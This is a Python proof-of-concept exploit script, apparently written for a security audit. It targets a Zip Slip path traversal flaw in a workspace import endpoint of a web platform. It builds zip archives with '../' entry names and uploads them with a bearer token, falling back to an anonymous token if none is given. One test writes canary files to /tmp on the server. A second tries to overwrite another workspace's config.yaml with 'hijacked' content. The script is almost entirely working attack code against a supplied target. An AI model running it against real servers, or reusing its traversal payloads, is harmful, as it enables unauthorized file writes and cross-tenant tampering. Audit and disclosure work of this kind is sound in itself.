#!/usr/bin/env python3
"""
PoC #8 — Zip Slip: Arbitrary File Write on Workspace Import
HIGH: path.join does NOT prevent directory traversal in zip entry paths.
filesystem.ts import() writes entry.path without validating it stays within base dir.

Usage: python3 poc_08_zip_slip.py --target https://dev.example.com --workspace-id WS_ID --token AUTH_TOKEN
"""

import argparse
import requests
import zipfile
import io
import urllib3
urllib3.disable_warnings()


def create_malicious_zip_canary():
    """Create a zip with path traversal entries that write a harmless canary file."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Normal file
        zf.writestr("workspace/normal.yaml", "name: poc-test\n")

        # Path traversal — write canary to /tmp
        zf.writestr(
            "workspace/../../../tmp/prismeai-zipslip-poc.txt",
            "ZipSlip PoC - Security Audit\nThis file was written via path traversal in workspace import.\nSafe to delete.\n"
        )

        # Deeper traversal attempt
        zf.writestr(
            "workspace/../../../../tmp/prismeai-zipslip-deep.txt",
            "Deep ZipSlip PoC\n"
        )

    buf.seek(0)
    return buf


def test_zip_slip_import(base_url, workspace_id, token):
    """Import a workspace zip with path traversal entries."""
    print("\n[*] Creating malicious zip with path traversal entries...")
    malicious_zip = create_malicious_zip_canary()

    print(f"[*] Uploading to workspace import endpoint...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/import"
    headers = {
        "Authorization": f"Bearer {token}",
    }
    files = {
        "file": ("workspace.zip", malicious_zip, "application/zip"),
    }

    try:
        r = requests.post(url, headers=headers, files=files, verify=False, timeout=30)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] Import accepted!")
            print(f"  Response: {r.text[:500]}")
            print(f"  [INFO] Check if /tmp/prismeai-zipslip-poc.txt exists on the server")
            return True
        elif r.status_code == 400:
            print(f"  [INFO] Server returned 400 — may have partial validation")
            print(f"  Response: {r.text[:500]}")
        else:
            print(f"  Response: {r.text[:500]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_zip_slip_overwrite(base_url, workspace_id, token):
    """Attempt to overwrite a config file via zip slip."""
    print("\n[*] Test 2: Zip with traversal targeting config overwrite...")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("workspace/normal.yaml", "name: poc-overwrite\n")
        # Try to write to the workspace storage base directory
        zf.writestr(
            "workspace/../../other-workspace-id/config.yaml",
            "# Cross-workspace write via ZipSlip\nname: hijacked\n"
        )
    buf.seek(0)

    url = f"{base_url}/v2/workspaces/{workspace_id}/import"
    headers = {"Authorization": f"Bearer {token}"}
    files = {"file": ("workspace.zip", buf, "application/zip")}

    try:
        r = requests.post(url, headers=headers, files=files, verify=False, timeout=30)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] Cross-workspace write may have succeeded!")
            print(f"  Response: {r.text[:500]}")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC #8: Zip Slip Arbitrary File Write")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    results = {}
    results["canary_write"] = test_zip_slip_import(base, args.workspace_id, args.token)
    results["cross_workspace"] = test_zip_slip_overwrite(base, args.workspace_id, args.token)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'POTENTIALLY VULNERABLE' if v else 'NOT VULNERABLE / ERROR'}")
    print("\n[*] NOTE: Server-side file check needed to confirm write location")


if __name__ == "__main__":
    main()
